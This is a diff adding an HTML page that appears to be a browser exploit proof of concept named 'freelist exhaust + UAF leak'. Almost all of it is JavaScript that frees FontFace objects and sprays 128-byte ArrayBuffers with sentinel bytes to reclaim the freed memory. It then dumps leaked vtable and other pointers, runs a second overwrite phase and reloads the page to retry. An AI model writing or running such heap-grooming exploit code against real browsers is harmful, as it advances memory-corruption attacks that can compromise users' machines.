@@ -1,0 +1,177 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p688b: freelist exhaust + UAF leak</title></head>
+<body style="color:#000;background:#fff;font:12px monospace;padding:8px;">
+<div style="font-size:24px;">p688b: freelist exhaust + UAF leak</div>
+<div id="log" style="white-space:pre-wrap">LOADING...</div>
+<script>
+(function(){
+  var log=document.getElementById('log');
+  function emit(tag,msg){log.textContent+=tag+': '+msg+'\n';}
+  
+  var loadNo=0;
+  try{var _l=parseInt(localStorage.getItem('p688bloads')||'0',10);loadNo=_l+1;localStorage.setItem('p688bloads',String(loadNo));}catch(e){}
+  emit('LOAD','loadNo='+loadNo);
+  
+  // === STEP 1: Create many FontFaces ===
+  var NUM=64;
+  var fonts=[];
+  for(var i=0;i<NUM;i++){
+    var fam='F'+i+'_'+Math.random().toString(36).slice(2,6);
+    var st=document.createElement('style');
+    st.textContent="@font-face { font-family: '"+fam+"'; src: local(Arial); }";
+    document.head.appendChild(st);
+    var ff=new FontFace(fam,'local(Arial)');
+    document.fonts.add(ff);
+    fonts.push({ff:ff,st:st});
+  }
+  emit('CREATE','created '+NUM+' fonts');
+  
+  // === STEP 2: Free all FontFaces ===
+  for(var i=0;i<NUM;i++){
+    fonts[i].st.remove();
+    try{document.fonts.delete(fonts[i].ff);}catch(e){}
+  }
+  document.body.offsetHeight;
+  emit('FREE','all fonts freed, 128-byte freelist populated');
+  
+  // === STEP 3: Spray 128-byte buffers with 0xAA sentinel at +0x85 ===
+  var bufs=[];
+  for(var i=0;i<128;i++){
+    var ab=new ArrayBuffer(128);
+    var v=new Uint8Array(ab);
+    for(var j=0;j<128;j++)v[j]=0;
+    v[0x85]=0xAA;
+    bufs.push(v);
+  }
+  emit('SPRAY','sprayed 128 buffers of 128 bytes, sentinel 0xAA at +0x85');
+  
+  // === STEP 4: Trigger freelist walk by re-creating FontFaces ===
+  // This forces the font system to allocate from the freelist
+  emit('RECREATE','attempting to allocate FontFaces from freelist');
+  var recreated=[];
+  for(var i=0;i<NUM;i++){
+    var fam2='F2'+i+'_'+Math.random().toString(36).slice(2,6);
+    var st2=document.createElement('style');
+    st2.textContent="@font-face { font-family: '"+fam2+"'; src: local(Arial); }";
+    document.head.appendChild(st2);
+    var ff2=new FontFace(fam2,'local(Arial)');
+    document.fonts.add(ff2);
+    recreated.push({ff:ff2,st:st2});
+  }
+  document.body.offsetHeight;
+  emit('RECREATE-DONE','recreated '+NUM+' fonts');
+  
+  // === STEP 5: Check which buffers were reclaimed ===
+  var reclaimed=[];
+  var notReclaimed=[];
+  for(var i=0;i<bufs.length;i++){
+    if(bufs[i][0x85]!==0xAA){
+      reclaimed.push(i);
+    }else{
+      notReclaimed.push(i);
+    }
+  }
+  emit('CHECK','reclaimed: '+reclaimed.length+' buffers, not-reclaimed: '+notReclaimed.length+' buffers');
+  emit('RECLAIMED-INDICES','first 10: '+reclaimed.slice(0,10).join(','));
+  
+  // === STEP 6: If reclaimed, dump the FontFace structure from the ArrayBuffer ===
+  if(reclaimed.length>0){
+    var firstIdx=reclaimed[0];
+    var ab=bufs[firstIdx];
+    var view32=new Uint32Array(ab.buffer);
+    var view8=new Uint8Array(ab.buffer);
+    
+    // Dump first 32 words (128 bytes) as hex
+    var dump32=[];
+    for(var i=0;i<view32.length;i++){
+      dump32.push('0x'+view32[i].toString(16).padStart(8,'0'));
+    }
+    emit('LEAK-DUMP32','first reclaimed buffer as 32-bit words: '+dump32.join(' '));
+    
+    // Dump as bytes (first 64 bytes)
+    var dump8=[];
+    for(var i=0;i<Math.min(view8.length,64);i++){
+      dump8.push('0x'+view8[i].toString(16).padStart(2,'0'));
+    }
+    emit('LEAK-DUMP8','first reclaimed buffer as bytes: '+dump8.join(' '));
+    
+    // Try to read vtable pointer (typically first 8 bytes)
+    var vtable=view32[0];
+    var familyPtr=view32[1];
+    var sourcePtr=view32[2];
+    emit('LEAK-STRUCT','vtable=0x'+vtable.toString(16).padStart(8,'0'),
+                        'familyPtr=0x'+familyPtr.toString(16).padStart(8,'0'),
+                        'sourcePtr=0x'+sourcePtr.toString(16).padStart(8,'0'));
+    
+    // Try to spray again and see if we can overwrite the FontFace
+    // by freeing the recreated fonts and spraying again
+    emit('PHASE2','starting phase 2: overwrite test');
+    
+    // Free the recreated fonts
+    for(var i=0;i<recreated.length;i++){
+      recreated[i].st.remove();
+      try{document.fonts.delete(recreated[i].ff);}catch(e){}
+    }
+    document.body.offsetHeight;
+    emit('PHASE2-FREE','phase 2 fonts freed');
+    
+    // Spray again with different sentinel
+    var bufs2=[];
+    for(var i=0;i<128;i++){
+      var ab2=new ArrayBuffer(128);
+      var v2=new Uint8Array(ab2);
+      for(var j=0;j<128;j++)v2[j]=0;
+      v2[0x85]=0xBB;
+      bufs2.push(v2);
+    }
+    emit('PHASE2-SPRAY','sprayed 128 buffers with 0xBB at +0x85');
+    
+    // Trigger freelist walk again
+    for(var i=0;i<NUM;i++){
+      var fam3='F3'+i+'_'+Math.random().toString(36).slice(2,6);
+      var st3=document.createElement('style');
+      st3.textContent="@font-face { font-family: '"+fam3+"'; src: local(Arial); }";
+      document.head.appendChild(st3);
+      var ff3=new FontFace(fam3,'local(Arial)');
+      document.fonts.add(ff3);
+    }
+    document.body.offsetHeight;
+    emit('PHASE2-TRIGGER','phase 2 trigger done');
+    
+    // Check if the same buffers are still overwritten
+    var stillOverwritten=0;
+    for(var i=0;i<bufs.length;i++){
+      if(bufs[i][0x85]!==0xAA){
+        stillOverwritten++;
+      }
+    }
+    emit('PHASE2-RESULT','still-overwritten: '+stillOverwritten+'/'+bufs.length);
+    
+    // Check bufs2 for new reclaims
+    var reclaimed2=[];
+    for(var i=0;i<bufs2.length;i++){
+      if(bufs2[i][0x85]!==0xBB){
+        reclaimed2.push(i);
+      }
+    }
+    emit('PHASE2-RESULT2','phase 2 reclaimed: '+reclaimed2.length+'/'+bufs2.length);
+    
+    if(reclaimed2.length>0){
+      var idx2=reclaimed2[0];
+      var ab2=bufs2[idx2];
+      var v32=new Uint32Array(ab2.buffer);
+      var d2=[];
+      for(var i=0;i<v32.length;i++){
+        d2.push('0x'+v32[i].toString(16).padStart(8,'0'));
+      }
+      emit('PHASE2-LEAK','phase 2 reclaimed buffer: '+d2.join(' '));
+    }
+  }else{
+    emit('NO-RECLAIM','no buffers reclaimed, freelist may be empty or use different size');
+  }
+  
+  emit('DONE','load='+loadNo);
+  
+  setTimeout(function(){location.reload();},5000);
+})();
+</script>
+</body></html>
